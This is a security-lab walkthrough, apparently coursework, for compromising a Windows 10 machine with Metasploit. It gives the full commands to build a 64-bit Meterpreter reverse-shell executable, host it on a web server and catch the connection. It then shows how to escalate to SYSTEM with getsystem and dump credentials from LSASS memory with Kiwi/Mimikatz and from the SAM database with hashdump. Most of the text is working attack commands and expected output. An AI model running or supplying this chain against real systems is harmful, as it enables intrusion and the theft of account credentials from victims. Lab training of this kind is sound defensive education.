# Security Tools: Use Meterpreter to Dump Password Hashes Stored in the SAM Database and LSASS

---

## Objectives
- Establish a SYSTEM-level Meterpreter session on a Windows target (same delivery method as Exercise 6, using a 64-bit payload).
- Load Meterpreter's Kiwi (Mimikatz) extension to extract credentials directly from LSASS memory.
- Dump the local password hashes stored in the SAM database.

---

## Tools
- **MSFVenom** — generates a 64-bit Windows Meterpreter reverse-TCP payload.
- **Apache2** (on Kali) — hosts the payload for delivery.
- **Metasploit Framework (`msfconsole`)** — sets up the `multi/handler` listener.
- **Meterpreter + Kiwi (Mimikatz) extension** — used to dump LSASS credentials and SAM hashes.

---

## Steps

### On Kali Linux (Attacker Machine)

**1. Get the Kali IP address (this is `LHOST`)**
```
ip a
```
(e.g., `192.168.1.17`)
```
ping -c5 <target IP address>
```

**2. Generate a 64-bit Meterpreter payload**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f exe -o /home/kali/Desktop/reverseshell.exe
sudo mv /home/kali/Desktop/reverseshell.exe /var/www/html/
service apache2 start
service apache2 status
```

**3. Start Metasploit**
```
msfconsole
```

**4. Set up the listener**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.17
set LPORT 4444
exploit
```
This shows: `[*] Started reverse TCP handler on 192.168.1.17:4444` and waits for a connection.

### On Windows 10 (Target Machine)

1. Download/receive the payload: `http://192.168.1.17/reverseshell.exe`
2. Locate the payload file (usually in Downloads or Desktop).
3. Right-click `reverseshell.exe` → **Run as administrator**.
4. Accept the UAC prompt (click **Yes**).
5. If Windows Defender interferes: temporarily disable real-time protection in the lab environment.

### Back on Kali (Attacker Machine)

You will see:
```
[*] Meterpreter session 1 opened (192.168.1.17:4444 -> 192.168.1.10:xxxxx)
```

**6. Escalate privileges**
```
meterpreter > getsystem
meterpreter > getuid
```
Expected result:
```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
Server username: NT AUTHORITY\SYSTEM
```

**7. Load Kiwi (Mimikatz) into the session**
```
meterpreter > load kiwi
```

**8. Extract credentials from LSASS memory**
```
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

**9. Dump password hashes from the SAM database**
```
meterpreter > hashdump
```

---

## My Solution:

[View My Solution:](https://youtu.be/UQui1Z5ubTY)

---
